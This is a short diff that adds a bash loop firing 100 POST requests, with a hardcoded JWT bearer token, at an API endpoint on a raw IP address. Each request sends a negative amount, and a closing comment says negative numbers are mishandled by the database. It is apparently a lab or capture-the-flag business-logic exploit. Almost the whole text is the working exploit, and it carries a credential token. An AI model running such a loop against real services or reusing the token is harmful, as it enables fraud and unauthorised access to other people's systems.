@@ -1,0 +1,4 @@
+for i in {1..100}; do   curl -X POST -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFzZmFkIiwiaWF0IjoxNzQzODk3MTEzLCJleHAiOjE3NDM5MDA3MTN9.76qPIdHiTTEbtK0I9HpFo3o31PwUVbYU3_tFzSe5SaU"     -H "Content-Type: application/json"     -d '{"amount":-139}'     http://52.188.82.43:8090/api/cli
+ck; done
+
+# Sending -ve amount fixes this the db does not handle negative numbers properly
